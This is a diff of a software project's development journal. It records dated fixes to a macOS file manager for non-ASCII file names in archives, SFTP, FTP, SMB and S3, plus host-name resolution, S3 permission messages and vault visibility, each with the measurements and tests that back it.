+better question: renaming *from* `\217\240…` has no sensible starting point. `beginRename` now
+consults `offerNameEncodingBeforeTyping` before building the field. The general shape is in
+docs/NOTES.md — **a gesture whose input the user authors must resolve its preconditions before taking
+the input.** Its control crashed rather than failed (the field opens, and a live field editor in a
+retained window kills the test host — the same reason `RenameReachTests` drives only refusals), so it
+was run with the field creation silenced as scaffolding: it then failed on exactly its own test with
+`renamingEntryID → …/\217\255….txt`, the reported bug verbatim, while both narrowness controls
+stayed green. Validation: 1,107 app tests, 3,244 core, both linters, the CI scripts, and a live run —
+F2 raises the chooser with no field, Use re-lists readable, F2 again renames, and ⌘Z restored the
+fixture to its original 366 bytes and mtime.
+
+**2026-09-10 (second) — F2 renames a member of a browsed archive**, which had never been
+implemented — `ArchiveBackend` is `.read` and `ArchiveWriter` had `delete` and `add` and no rename,
+so the key was dead there for every archive and the chooser had nothing to attach to. It is
+`delete`'s twin one verb over: `ArchiveMutation.renamedInnerPath` derives the new inner path,
+`ArchiveWriter.rename` does one `moveItem` inside the same extract → repack → atomic swap, and the
+container's copy makes it undoable. Measured rather than assumed: `FileManager.moveItem` refuses an
+occupied destination itself (bytes untouched) *and* still performs a case-only change on APFS, so
+the staged move is its own collision guard where the local rename needs a `stat` — `rename(2)`
+overwrites. `renameRoute(for:)` is the one answer the key, its validator and the commit read;
+**⇧F2 deliberately keeps the narrower `canRenameHere`**, because its apply loop renames each target
+with `backend.moveItem`, which an archive refuses — batching N renames into the one rewrite the
+container wants is its own slice. `ArchiveWriter` split by concept at the lint ceiling: the engine
+stays, the three edits move to `ArchiveWriter+Edits.swift`. Controls: the route's archive branch
+removed fails the reach table, the validator and the nested-route test; the chooser offer removed
+fails only F2's; the writer's name guard removed lets `../escape.txt` **rewrite the archive and move
+the member out of its folder**, which its test caught by the returned snapshot. Validation: 1,105
+app tests, 3,244 core tests, both linters, all three CI scripts, and a live run — F2 inside
+`legacy-encrypted.zip` reaches the passphrase prompt (the local route never would), and inside an
+ordinary zip `bsdtar` confirms the member renamed with its bytes intact and ⌘Z put the container
+back byte for byte.
+
+**2026-09-10 (first of the day) — the code-page chooser reaches every gesture that asks for a
+member's bytes**, not only the three writes it shipped with. Reported by a user: ⏎, F4, ⌘Y,
+⌃Q, ⏎ into a nested archive and every hand-off that stages members first each met the same
+`entryNameNotUTF8` refusal and reported it as an ordinary failure — *"Couldn't open this item"*,
+true and useless, naming an archive that is fine. Four handlers now consult `offerNameEncoding`
+before reporting; `Materialize` had to carry the **failing archive** out beside the error, since
+with several archives in one gesture only its own loop knows which got that far. The
+cursor-following preview stays silent on purpose. `ArchiveNameEncodingGestureTests` drives all
+five in a windowed pane and asserts *which* sheet is up by button count — the chooser's popup and
+two buttons against a report's lone OK — because the branch it replaces also ends in a sheet.
+Control: the four guards removed fails all five and leaves both narrowness tests green.
+Validation: 1,093 app tests, 3,241 core tests, both linters, and a live run against
+`legacy-plain.zip` — ⏎ and ⌃Q both raise the chooser where the shipped build raised the alert.
+
+**2026-09-09 (last of the day) — M27's three unverified paths, and the one that was hiding a file
+of zeros.** The milestone closed with three paths *threaded and never run*: an archive that is
+**encrypted *and* legacy**, the **write-back batch** and **nested-archive entry** call sites, and
+`ArchivePreviewCache` entries minted before a declaration. Two were arguments and one was a hope.
+Running all three cost one new fixture and turned up a real bug on the first of them.
+
+**The fixture is why none of it had been run.** APFS refuses a non-UTF-8 file name, so nothing on
+this disk can *be* named in a code page for a packer to read, and nothing on this Mac writes an
+AES-256 zip but Dirnex. `LegacyNameZip` mints one by packing each non-ASCII member under an ASCII
+placeholder **of the same byte length** and then rewriting its name bytes in the local header and the
+central directory — nothing in zip checksums a name, so no offset moves and no CRC needs repairing.
+The container is scaffolding through the type's own writer and the name bytes are written by hand,
+which is the split the reader-under-test rule asks for. `LegacyNameZipFixtureTests` is what makes it
+usable rather than plausible: it reproduces the committed 218-byte blob's answers exactly — `nil`
+undeclared, `Панорама.txt` under CP866, `Џ ­®а ¬ .txt` under CP1251, `nil` under CP1252 — with the
+CP1251 expectation taken from Python's decoder rather than from ours.
+
+**The reader composes and the routing in front of it did not.** `ArchiveExtractor.needsPassphrase`
+was derived from an inspection, and inspecting a legacy archive throws on the first name — so for an
+archive that is both things the `try?` in front of it read that throw as **"no passphrase needed"**,
+no passphrase was ever asked for, and the extraction fell through to `bsdtar`. Measured: `bsdtar`
+spent **6.10 s** and **170 144 bytes** of `Enter passphrase:` at a stream nobody reads and then wrote
+an **8-byte file of zeros** under the right name and the right size, which the extractor's own "did
+anything land" guard reported as a **success**. That is with stdin at `/dev/null`, which is a
+LaunchServices-launched app; the negative control, run in a test host whose stdin is not, never
+returned at all and had to be killed — the same shell-vs-LaunchServices split this file keeps
+meeting, arriving on a hang.
+
+So the encryption question stopped depending on the names.
+``EncryptedArchiveReader.holdsEncryptedEntries`` reads `archive_entry_is_encrypted` off the raw
+header, which needs no name to be representable, and `needsPassphrase`'s `nameEncoding` parameter
+**went away** rather than being threaded harder: with the right primitive there is nothing left to
+pass wrongly. An undeclared encrypted legacy archive now takes the in-process reader, refuses for the
+name, and the chooser is offered — nothing is guessed and nothing is written.
+
+**A second claim turned out to be false in the same place.** F5 copy-out has been named as a route to
+the chooser since the chooser shipped, and it was not one: `bsdtar` cannot be handed a name it could
+not decode — the pane drew `���.txt`, which is what the extraction then asks for — so nothing landed
+and the extractor reported `archiveExtractFailed`, which `offerNameEncoding` matches by *case*. The
+gesture said "couldn't extract from the archive" and offered nothing, on the archive whose whole
+problem is a question nobody had been asked. The empty-extraction branch now asks why, once, and only
+once nothing has landed, so the ordinary failure costs no extra read.
+
+**The other two paths were sound, and one is better than it was argued to be.** ⏎ into a nested
+archive named in CP866 was driven end to end through the shipped `beginNestedArchiveEntry` — the
+extraction, the temp mount, the navigation — landing on the inner archive's own member. And the
+preview cache's entries are not merely *unreachable* after a declaration: they cannot be **minted**,
+because the only row a cursor can rest on before one is named with U+FFFD substitutes and that
+extraction refuses rather than caching anything. The ASCII member cached beforehand stays correct,
+which is the half worth asserting — a declaration changes how names are read and changes nothing
+about the file, so the identity check correctly does not fire. The write-back batch's own sheet is
+still not drivable (`sheetAnswer(over:whenUnasked: .cancel)` answers *cancel* with no window, and
+with one it is a real sheet in front of a test host), so what runs is everything after the answer:
+`ArchiveWriter.add` under a declaration, which nothing had ever done.
+
+Four negative controls, each on exactly the tests named for it: the old `needsPassphrase` (two
+tests, one of them reproducing the zeros as `thrown → nil`), the old empty-extraction reason (two),
+the declaration dropped at the nested call site (one), and dropped on the way into the rewrite (one).
+The third of those wedged the run rather than failing it — `presentOperationFailure` keeps its
+`runModal` fallback for a gesture somebody made, correctly — and had to be re-run with that one
+dialog silenced as scaffolding, which is worth knowing as the *constructive* half of a warning this
+file has only ever stated as a hazard.
+
+Two things about the runs. The nested-archive test took **17–22 s** of the house 30 s budget with the
+pane's view loaded and **10.4–14.5 s** with its model seeded instead, which is not three `bsdtar`
+spawns but the main actor other suites' live panes hold (▸ docs/NOTES.md). And the neighbour that
+went red in one of those runs had not been pushed over by any of this: `ArchiveWatchReachTests`'
+repack test failed **1 run in 4** with the new suites in and **1 in 4 with the tree stashed back to
+HEAD** — the baseline that stops "it was green before" being read as evidence about the code rather
+than about the machine.
+
+**2026-09-09 (later) — archives and S3 audited; the locale pin had a cost nobody had looked for.**
+Asked to check the two remaining backends. S3 came back clean and the archive side turned up two
+more bugs, one of them introduced earlier the same day.
+
+**In-process libarchive had the `bsdtar` bug, and `ChildProcessLocale` cannot reach it.**
+`EncryptedArchiveWriter` calls libarchive inside this process, where there is no child to hand an
+environment to — and Dirnex never calls `setlocale`, so the process locale is `C`. Measured: an
+archive packed there, **encrypted or not**, stored `Панорама.txt` with the right UTF-8 bytes and the
+zip's UTF-8 flag **clear**, so it listed perfectly in Dirnex and as `╨ƒ╨░╨╜╨╛╤Ç╨░╨╝╨░.txt`
+everywhere else. `setlocale` is process-global on a threaded GUI app, so the fix is libarchive's own
+`hdrcharset=UTF-8` write option — measured to set bit 11 with no locale set. Zip-only, which is also
+the whole truth: a `pax` tar stores raw bytes and a `7zip` archive stores UTF-16, and both read back
+exactly under `C`. Only zip has a flag to get wrong.
+
+**And the locale pin moved a failure from *ugly* to *fatal*.** `String(bytes:encoding:.utf8)` is
+all-or-nothing, and every subprocess reader carried `?? ""` behind it. Under `C`, `bsdtar` escaped
+every non-ASCII byte, so its output was pure ASCII and always decoded; pinned to UTF-8 it escapes
+some bytes and passes others raw — invalid UTF-8. On a real legacy zip (CP866 names, flag clear, the
+shape WinRAR wrote for years) that took the archive from *"lists with `\217\240…` names"* to
+**`archiveUnreadable`**. The pin is still right; the decode was what had to go. `SubprocessText`
+now decodes leniently at the four listing readers — the archive table of contents, the SFTP capture,
+and FTP's single and batched listings — so a name that cannot be represented costs its own row
+rather than the directory. The same shape was latent on SFTP and FTP and is *silent* there: the
+listing decodes to `""` and the pane draws an empty folder, which reads as "the folder is empty".
+
+**S3 needed nothing.** `S3Key.encode` walks the UTF-8 bytes, so a Cyrillic key becomes `%D0%9F…` in
+the URL and in `x-amz-copy-source` alike, and the `DeleteObjects` body declares `encoding="UTF-8"`
+and escapes only the XML metacharacters. Verified on the wire against `Tooling/fake-s3-endpoint.py`,
+which logged the key it received as `Панорама.jpg`, and it was already covered — `S3KeyTests` pins a
+Cyrillic key and `S3WriteArgumentsTests` pins the copy-source encoding.
+
+The rewrite path still refuses an archive whose entry names are not UTF-8 (`entryNameNotUTF8`), and
+that stays: rewriting means writing every name back, and a name we cannot represent would be
+corrupted. Browsing such an archive now works, which is what the report would have been about.
+*(Superseded the same day — see below.)*
+
+**2026-09-09 (later still) — a legacy archive's code page can be declared, and then everything
+works.** Asked whether the rewrite could handle those names after all. Three measurements settled the
+design before any Swift. **APFS refuses a non-UTF-8 file name outright** (`EILSEQ`), and the rewrite
+stages on disk — `bsdtar -x` hits the same wall itself, `Can't create '\217\240…': Illegal byte
+sequence`, exit 1, under *either* locale — so the refusal was never conservatism, it was the only
+answer available. libarchive's **`hdrcharset` read option** turns the bytes into the real name
+(`CP866` → `Панорама.txt`), and **Apple's `bsdtar` has no `--hdrcharset`**, so the in-process reader
+is the only one that can apply it. A streaming entry-to-entry rewrite was considered and rejected: it
+preserves bytes nobody can read, still cannot extract that row *out* of the archive, and needs a
+third engine.
+
+So the user declares the code page (`ArchiveNameEncoding`, 19 of them) and everything downstream is
+unchanged — once a name decodes it is an ordinary `String` and a legal APFS name. `CompositeBackend`
+holds the declaration beside the mount cache it must invalidate; a declared archive lists and
+extracts through libarchive while the **repack stays `bsdtar`**, which is what keeps the container
+format. The chooser previews real sample names per candidate and offers only the code pages that
+*fit*, because a wrong one does not fail — it produces well-formed nonsense, and can be *invisibly*
+wrong: CP1251 reads that fixture's separators as no-break spaces and soft hyphens, which cost one
+test failure that read as a bug in the reader. Nothing asks unprompted; the offer arrives when a
+gesture hits the refusal, which happens before the archive is touched.
+
+Verified through the real `ArchiveWriter`: deleting either member of the CP866 fixture leaves the
+other one correct, and the rewritten archive reads back **with no declaration at all** — `bsdtar`
+writes UTF-8 names with the zip's flag set, so the archive is upgraded on the way through. Four
+negative controls fired (a typoed `hdrcharset` token, a neutered misfit detector, an extract that
+ignores the declaration, a catalog entry disagreeing with the core), each on exactly the tests named
+for it while the narrowness controls stayed green.
+
+**2026-09-09 (later still, closing M27) — a way in that is not a failure, thirteen translations,
+and a cost that was bounded on the wrong quantity.** The chooser above was reachable only when a
+gesture the user made hit the refusal — F8, a paste, an F5 copy-out — so somebody who merely wanted
+to **read** the names had no route at all. `file.archiveNameEncoding` ("Archive Name Encoding…") is
+that route: a registry command in the File menu beside Pack, enabled while the pane is inside an
+archive whose names did not decode. Both of the traps the plan named were paid: the enable/disable
+rule is one property (`archiveAwaitingNameEncoding`) the validator and the action both read, and the
+item carries no submenu, so its own key equivalent could fire if it ever gained one.
+
+The predicate is a question about the **archive**, not the folder: `ArchiveTOC.hasUnreadableNames`,
+computed once at mount from the U+FFFD `SubprocessText` substitutes, peeked from the cached mount so
+a menu validator never spawns `bsdtar`. It also stays true once a code page **is** declared, which
+is the half that is easy to leave out — a wrong pick produces well-formed nonsense and raises no
+second refusal, so gated on the unreadable half alone, changing your mind would be impossible.
+
+**The cost claim was wrong.** The plan said the reads were bounded by sampling stopping at the first
+few non-ASCII names. Measured against real CP866 fixtures, that bounds the wrong quantity: every
+candidate costs the same **~260 ms** on a 50 000-entry zip whether it bails at the first entry or
+samples at the fifth, because what it pays for is the *open* — libarchive reading a five-megabyte
+central directory. All 19 came to 5 ms at 2 entries, 81 ms at 1 000, 1.4 s at 20 000 and **3.6 s** at
+50 000 (4.9 s with the non-ASCII names last), on the main actor, before the sheet. That is a
+beachball, so the reads moved to `BlockingWork.run`. The twenty-times-faster version was costed and
+**refused**: one open really would answer for every code page — with no `hdrcharset` set,
+`archive_entry_pathname` hands back the raw stored bytes verbatim while `archive_entry_pathname_utf8`
+answers NULL (probed; `hdrcharset=BINARY` is *not* available, `iconv_open` refuses it) — but decoding
+those nineteen ways in-process introduces a **second decoder**, and a preview whose whole job is to
+be recognised has to come from the reader that will do the reading.
+
+Two more things fell out. A `.tar.gz` whose names are in a code page was listed as threaded and never
+run; measured, the whole chain is identical (only zip has a charset *flag* to get wrong, and a tar
+simply stores the bytes), and the rewrite keeps the container — asserted on the gzip magic, since a
+repack that fell back to zip is invisible in every assertion about the members. And
+`scripts/check_localization_keys.py` caught **three strings from the landing that never reached the
+catalog** — the chooser's own title, body and Use button — each correctly `String(localized:)`-wrapped
+and therefore invisible to every bare-literal sweep, rendering English inside all thirteen translated
+builds. The 19 code-page names have their thirteen translations now, and
+`ArchiveNameEncodingLocalizationTests` demands them rather than pinning English-only.
+
+Six negative controls fired, each on exactly the tests named for it: `hasUnreadableNames` forced
+false and forced true, the validator's case removed, the already-declared clause dropped, the menu
+entry removed (the item still well-formed in the builder and in **no menu**, which is the trap
+docs/NOTES.md records), and one translation copied in from the English. Verified live afterwards
+against a seeded archive tab: the guard passed, `ask` returned in **0.0 ms** on the main thread, the
+reads ran off it, 11 fitting candidates landed in 13.5 ms and the sheet attached — and in an ordinary
+UTF-8 archive the same command reached the pane and raised nothing.
+
+**2026-09-09 — non-ASCII file names, on every protocol.** The SFTP fix the day before was one
+instance of a class, and the user's follow-up named the class: three screenshots — the NAS's own web
+UI showing `DSC_0697-Панорама.jpg`, an SFTP pane showing it correctly, and an **FTP** pane showing
+`DSC_0697-.jpg` — with *"we need to support all languages for all protocols"*. Two more bugs, two
+different mechanisms, and two tools that turned out to be fine.
+
+**FTP had no encoding negotiation at all.** Probed against the NAS: the server converts the on-disk
+UTF-8 name into its code page for `LIST` and writes one **`0x7F` (DEL)** per unmappable character,
+which is *valid UTF-8* — so nothing fails to decode, `FTPListingParser` parses the row perfectly, and
+the DELs do not draw. A plausible shorter name, which is the quiet direction. The write half is
+worse and permanent: the server reads our UTF-8 bytes *as* CP1252 and stores the result, so an upload
+named `Панорама` landed as `ÐŸÐ°Ð½Ð¾Ñ€Ð°Ð¼Ð°` (`d0`→`Ð`, `9f`→`Ÿ`). `curl` never negotiates UTF-8 and
+offers no option for it — it does not even send `FEAT` — so RFC 2640's `OPTS UTF8 ON` is sent as a
+quote command, `*`-prefixed. That prefix is load-bearing: unprefixed, a server that refuses `OPTS`
+makes `curl` exit **21** printing `QUOT command failed with 501`, and that reply code is exactly what
+`FTPTransportError.classify` reads out of stderr — every operation would fail *and* be explained by
+the wrong number. Prefixed, exit 0 and stderr empty. It goes in `common()` and in every batched and
+segmented *section*, since `curl` reads one option set per transfer.
+
+**`bsdtar` had the SFTP bug**, which is what turned two fixes into one rule. It renders names through
+`vis(3)` exactly as `sftp` does, so a browsed archive listed
+`./\320\237\320\260\320\275\320\276\321\200\320\260\320\274\320\260.txt` — and the
+*write* direction is the one that outlives the session: packed under the `C` locale a zip carries the
+right UTF-8 bytes with its **UTF-8 flag (bit 11) clear**, so Windows Explorer, Info-ZIP and Python's
+`zipfile` all read `╨ƒ╨░╨╜╨╛╤Ç╨░╨╝╨░.txt`. `SFTPChildEnvironment` became `ChildProcessLocale` and now
+arms the four `bsdtar` sites as well as the four `sftp`/`ssh` ones.
+
+**SMB and local were checked next, and SMB had a bug of its own — an *older-macOS* one.**
+`SMBMounter.mountURLString` built `smb://host/<share>` by concatenation and handed it to
+`URL(string:)`. Correct on macOS 26, whose RFC 3986 parser percent-encodes a space or a non-ASCII
+character by itself; Dirnex deploys to **macOS 14**, whose parser does not. Probed through
+`CFURLCreateWithString` — the strict parser, still reachable here — `smb://nas.local/My Share` and
+`smb://nas.local/Панорама` both return **nil**, and both percent-encoded spellings parse. So on
+macOS 14 a share called **"My Share"** cannot be mounted at all, which makes this reachable by a
+user with an entirely ASCII setup and invisible on the machine it was written on. Only the *mount*
+URL is encoded; `SMBLocation.url` stays the string the user typed, because it is what the address
+field shows, what the sidebar stores, and what has to round-trip through `SMBLocation(url:)`.
+
+**Everything else in the audit was already right**, which is worth recording so it is not re-probed:
+`git` (`-z`), `curl` and `mdfind` all emit raw UTF-8 with no locale set — mdfind checked in both
+directions against a real Spotlight index, output paths *and* a non-ASCII query term. **Local** is
+clean by construction, no subprocess rendering a name: `LocalBackend` lists, stats and operates on
+Cyrillic, Japanese, Korean, Hebrew and emoji names unchanged. **SMB browsing** inherits that —
+verified live against the NAS by driving `NetFSMountURLSync` itself, creating Cyrillic and Japanese
+files on the mounted share and reading them back through the real `LocalBackend`, exact and
+unescaped. And **S3** decodes its percent-encoded keys correctly.
+
+**The`-only-testing` trap cost a wrong conclusion on the way.** The SMB assertion was appended to the
+end of a file holding *two* suites, so it landed in the second one and the filtered run reported
+success **with the fix reverted** — which reads as "my test is inert" and invites weakening it. The
+tell was the count, which had not moved.
+
+**The two tools that were already right are the useful half of the audit.** `git` is exact because it
+is asked for **`-z`**, which turns off `core.quotePath` entirely — measured, raw UTF-8 with no locale
+set, where the same command without `-z` answers `"\320\237…"` — and `curl` escapes nothing. So the
+rule is that a tool with a raw-output flag should be given it, and the locale pin is for the ones
+that have none; reaching for the pin where a flag exists would be a weaker second spelling of a
+guarantee already available.
+
+Guarded by `FTPUTF8NegotiationTests` (every builder and every section negotiates, and the `*` is
+asserted), `ChildProcessLocaleTests`, and `ArchiveNonASCIINameTests`, which packs a real archive and
+reads its central directory **by hand** rather than asking `bsdtar` what it wrote — the tool reads
+its own output back correctly under either locale, so only an independent reader can see the flag.
+Reverted, the control fails on both claims and captures the subtlety exactly:
+`name: "Панорама.txt", declaresUTF8: false` — right bytes, wrong flag. Verified live against the NAS
+in both directions with the exact shipped argv; the throwaway `pyftpdlib` server is UTF-8 by default
+and can see none of the FTP half, which is the disjoint-corpus trap this project has now met three
+times.
+
+**2026-09-08 — a file copied to a server is not renamed; `sftp` was reading its name back through
+the C locale.** Reported with two screenshots: `DSC_0697-Панорама.jpg` copied to a NAS, and a pane
+listing `DSC_0697-\320\237\320\260\320\275\320\276\321\200\320\260\320\274\320\260.jpg`
+beside it. The word in the report was *renamed*, and that turned out to be the one thing that had
+not happened.
+
+Probed before any Swift, against a throwaway `sshd` (OpenSSH 10.3). The file on the server carries
+the real UTF-8 bytes (`d0 9f` for `П`, confirmed by the server's own `ls`), so `put` had carried the
+name correctly; what escapes is the **client**, whose `ls -la` renders each name through `vis(3)`.
+One file, five environments: escaped under `LC_ALL=C` **and under no locale variables at all**,
+verbatim under `LC_CTYPE=UTF-8`, `LC_ALL=en_US.UTF-8` and `LC_ALL=ru_RU.UTF-8`. So nothing about the
+argv, the parser or the server decided it — a variable nobody had set did.
+
+**Not a display bug**, which is what made it worth a slice rather than a cosmetic fix: the pane draws
+the escaped name and every verb builds its path from it, where `SFTPCommands.quote` doubles each
+backslash — so the server is asked for a file literally called `DSC_0697-\320\237…` and answers
+**not found**. Measured: the download lands nothing and `sftp` still exits 0. Download, rename,
+delete and stat all failed on a file that was perfectly fine, which is the S3 `+`-for-space bug
+(NOTES ▸ curl for S3) reached through a different encoding.
+
+What hid it since M5 is **how the app is launched**. `launchctl getenv` answers empty for `LANG`,
+`LC_ALL` and `LC_CTYPE`, so a LaunchServices-launched Dirnex always handed `sftp` the `C` locale,
+while a build run from a shell inherits the terminal's UTF-8 and lists perfectly — every developer
+run and every `xcodebuild test` sat in the good half. The same shell-vs-LaunchServices split M26
+records for TCC, arriving on a locale. The **exec channel never had it** (the server's own `ls`
+writes raw bytes into a pipe, measured in the same run), so search, sync and the sizer had been
+showing the right names all along while the ordinary listing did not — the app contradicting itself,
+which is what the report was really describing.
+
+`SFTPChildEnvironment.pinningLocale` is the fix, applied at one funnel every `sftp` and `ssh` spawn
+site goes through. Three decisions inside it, each measured. `LC_ALL` is **removed rather than
+overridden**, because `LC_ALL=C LC_CTYPE=UTF-8` escapes exactly as the bare `C` locale does — setting
+`LC_CTYPE` alone is the fix that looks complete. `LC_TIME` is pinned to `C` precisely *because*
+`LC_ALL` was removed: `sftp` localizes character type alone today, so the date column was never at
+risk, and with `LC_ALL` gone the category would otherwise fall through to the user's `LANG`. And the
+parser is deliberately **not** taught to un-escape, since `sftp` leaves a literal backslash
+unescaped (`back\slash.txt` lists verbatim) — `\320\237` in a name could genuinely be that name, so
+an un-escaper would silently rename a file for real.
+
+The other half of the fix is that **every** child is armed. Key auth had been leaving `environment`
+nil and inheriting the app's own, while password auth built one for the askpass wiring; the two paths
+differing in exactly that dimension is what let the bug reach only some users. Covered by
+`SFTPChildEnvironmentTests` (the rule), `SFTPProcessTransportWiringTests` (that the funnel applies
+it), and a live `SFTPNonASCIINameLiveTests` that uploads the reporter's own name and then downloads
+it **through the path the listing produced** — re-typing the literal would put the probe on neither
+side of the disagreement and passes against the broken build.
+
+**2026-09-04 — a server can be reached by its bare LAN name, the way SMB already could.**
+Reported as a question: `smb://nas` works and the FTP connect sheet answers *"The server couldn't be
+reached. Check the host name and port."* for the same `nas`. Both halves were measured before any
+Swift. The sentence is true and points at the wrong thing — `getaddrinfo("nas")` fails in **0.003 s**
+for every address family, because with no DNS search domain configured (`scutil --dns` showed none)
+a single label has nothing to be completed with, and `curl ftp://nas/` exits 6. SMB is not doing
+better name resolution; it is doing **different** name resolution — `NetFSMountURLSync` carries
+NetBIOS, and `smbutil lookup nas` answers off a broadcast, which is SMB-family machinery `curl` and
+`ssh` cannot borrow. It was never an FTP bug: `ssh nas` fails identically.
+
+So a bare label that resolves nowhere is now retried as `<host>.local`, which is the completion the
+user's own network already answers, for **SFTP and FTP alike**. The narrowness control is the half
+worth keeping: a single label the machine *can* already resolve — through `/etc/hosts` or a search
+domain — is kept and the fallback is never even asked about, or a working host would be silently
+re-pointed at a different machine on the LAN.
+
+The second half is what made it usable rather than merely correct. **An mDNS name costs a flat five
+seconds a lookup** — mDNS has no negative answer, so the AAAA query for a NAS that publishes no IPv6
+waits out its timeout: 5.005/5.007/5.008 s over three runs, against **0.003 s** held to IPv4, with
+`example.com` at 0.307 s as the control that says the stall is mDNS's and not hostname resolution's.
+Every FTP verb is a fresh `curl`, so that is five seconds *per listing*. `AI_ADDRCONFIG` does not
+dodge it. Both transports therefore carry the address family the resolution actually observed —
+`-4` for `curl`, `AddressFamily=inet` for `ssh` (5.07 s → 0.05 s) — which is never a downgrade,
+because it is set only once an IPv4 address has been seen.
+
+Two decisions are worth the sentence. The resolution lives in the **transport**, resolved once and
+cached, not in the connect flow: an *absent* `.local` name costs 5.003 s, and `connectFTP` is
+documented as costing no round trip precisely so session restore can run on the main actor at
+launch. And the dialed name is deliberately **not** written into the location — that host is the
+account's identity, keying the descriptor, the Keychain account and the saved record, so rewriting
+it would file the password under a name nothing looks up and leave a restored tab unable to match
+its own endpoint. Verified live end to end against a throwaway `pyftpdlib` server reached by this
+Mac's *own* Bonjour name (`Mac4` resolves nowhere, `Mac4.local` does — the reported shape, with no
+hardware involved): with the fallback, the seeded session restored, the server logged a login and
+the pane's cursor came back on `a-folder`, a name that exists only on that server; with it reverted
+and the app rebuilt, **zero** sessions and no cursor. Then confirmed on the reporter's own NAS across
+all three protocols it serves, each driven through the app on the bare label `nas`: **plain FTP**,
+**SFTP** and **explicit FTPS** all restored and listed, the pane's cursor landing on a directory that
+exists only there. FTPS needed its endpoint's `trustedPublicKey` seeded with the pin rather than a
+click, since the NAS presents Synology's default self-signed certificate (`CN = synology`) and the
+gesture otherwise ends in the trust sheet — which also exercised the half worth checking, that the
+fallback reaches the certificate probe's own argv. NOTES.md ▸ Resolving a host name
+
+**2026-09-04 — the shared gesture wait that could report a timeout over finished work.**
+Fixed the wait shared by `ChecksumMaterializeTests`.
+It checks completion before the deadline, allows 30 seconds for main-actor delays in full runs,
+and reports a timeout at the calling test. Regression tests cover completed and missing work at
+the deadline; the completed-work test fails with the old helper. Validation: 1,040 app tests
+(including the expected timeout check), 3,209 core tests, and both linters passed.
+
+**2026-09-03 — a refused S3 request names the IAM action it needed.** Reported as a question rather
+than a bug: F7 on an S3 account pane answered *"The server refused that. This account may not have
+permission for it."*, and the user asked whether the account really lacked the permission or Dirnex
+had got something wrong. It really lacked it — measured with `curl` against the live account, three
+unrelated bucket names each came back `403 AccessDenied` carrying *"not authorized to perform:
+s3:CreateBucket … because no identity-based policy allows the s3:CreateBucket action"*, while
+`ListAllMyBuckets` and `HeadBucket` answered 200 on the same key. So the diagnosis was right and the
+**sentence was empty**: it stopped exactly where the question started, and nothing in it can be acted
+on. The control that turned that into a measurement is one request — the byte-identical create for
+`dirnex-live-probe`, the one ARN that account's policy grants, answered **200**, which rules out the
+request shape, the signature, the region and the `LocationConstraint` body all at once.
+
+`S3Action` (core) is the vocabulary and ``VFSUnsupportedReason/s3ActionNotPermitted(action:)`` the
+reason, so the alert now reads *"…This account doesn't have the s3:CreateBucket permission."* — a
+token the account holder pastes into a policy. Four things decided its shape. The action is the
+**caller's own verb**, never scraped from AWS's prose, which is the remote's English and is not
+something an S3-compatible endpoint owes us; that makes the service's message an *independent*
+oracle instead of the input, and the live test asserts it, so an enum spelling `s3:PutBucket` would
+pass every headless test and fail against AWS. They are **IAM actions rather than REST verbs** —
+there is no `s3:HeadBucket`, `HeadBucket` and `ListObjectsV2` both riding on `s3:ListBucket` — so
+`CopyObject` deliberately names nothing, needing `s3:GetObject` on the source and `s3:PutObject` on
+the destination with no way to tell from a 403 which was missing. It is keyed on the **`<Code>`**
+and never on the 403, because that status also carries `InvalidAccessKeyId` and
+`SignatureDoesNotMatch`, where the user retypes a secret rather than editing a policy. And
+`vfsError(for:action:)` **defaults to `nil`**, so a site that does not know its verb is byte-identical
+to before — while `S3Backend.write(at:action:)` takes it with *no* default, so the compiler asks each
+caller rather than letting the next write lose its name quietly.
+
+Two things fell out. The core suite's own narrowness control in `S3MultipartConditionTests` failed —
+correctly, and against a better error: it had spelled "not read as a conflict" as `if case
+.unsupported`, exact while the three conflict reasons were the only `.unsupported` values that path
+could reach, and a proxy one level broader than its own name the moment a fourth arrived
+(docs/NOTES.md ▸ Testing). And the live half went in beside the suite that was already there
+(`S3AccountLiveIntegrationTests+BucketRefusals.swift`, an **extension** rather than a second `@Suite`
+so the `.serialized` trait still covers it), which put the parent file back under the 500-line
+ceiling along a real seam: everything left there is a pane crossing backends, and both refusals are a
+verb with no pane involved.
+
+**2026-09-02 — the vault visibility setting moved into Settings, and its default flipped on.** It
+had been a checked item on one vault's sidebar context menu since 2026-08-11, per vault and off
+(the entry below argues why). Both halves of that argument were reconsidered rather than one: a
+setting nobody can find is not a setting, and the thing most people want most of the time is to
+unlock a vault and then attach a file from it to an email. So `VaultLocation.showsInFinder` is gone
+and `AppPreferences.showVaultsInFinder` (Settings ▸ General) is the one answer, **on** by default —
+which means a vault is published to the whole Mac while it is unlocked unless somebody says
+otherwise, and *locking it* is what makes it private again rather than the attach flag. That is the
+deliberate part, and it is worth stating as a reversal rather than a tidy-up.
+
+Three things fell out of it. `DiskImageArguments.attach` lost its `showingInFinder: Bool = false`
+**default** — the right shape while the answer was a per-vault flag a call site could forget, and
+exactly wrong once one preference is the answer, since a default would be a second one and silently
+the opposite (docs/NOTES.md ▸ Design lessons, a defaulted store path). `VaultLocation` carries no
+settings at all now, so its hand-written `init(from:)` went with the field: the retired key is
+simply ignored by `JSONDecoder`, which is the *opposite* of the missing-key case that made it decode
+by hand — worth a test of its own with both stored JSON shapes in it, and worth the comment saying
+the synthesized decoder is only correct while every property stays required. And the live remount
+had to move: `VaultVisibility` (a singleton started from `AppDelegate`) hears the preference change
+and remounts every vault that is open right now, because `-nobrowse` is decided at attach time and a
+setting that only took effect at the next unlock would look like it did nothing.
+
+Verified live against a real throwaway encrypted sparsebundle, with the mount flags and
+`mountedVolumeURLs(options: [.skipHiddenVolumes])` as the judge rather than a screenshot. With the
+key never written, the unlock attached browsable (`0x04A09218`, `MNT_DONTBROWSE` clear) and Finder
+listed the disk by name; clicking the toggle off remounted the *open* vault to `0x04B09218` —
+`MNT_DONTBROWSE` set with `MNT_IGNORE_OWNERSHIP`, `MNT_NOSUID` and `MNT_NODEV` all still there,
+which is the finding that whole remount path exists for — and `skipHiddenVolumes` stopped returning
+it; clicking it back on reversed both. The attach-time control is separate and was run separately:
+locked, switch off, unlocked again, `nobrowse` present from the start. The sidebar's vault menu is
+now Unlock / Rename… / Remove from Sidebar, and a shown vault still appears under Vaults only, which
+is the rule `SidebarLocations.hidingVaults` has held since it stopped being free.
+
+**2026-09-01 — the live suites were run, and the run summary turned out to be no tell at all.**
+NOTES.md had recorded that morning that a live suite whose config file has gone reports success by
+*skipping*, and that `sendsPartsConcurrently` had therefore shipped with its suite never once having
+run against a server. The configs were gone again by evening, so **every** SFTP, FTP and S3 live
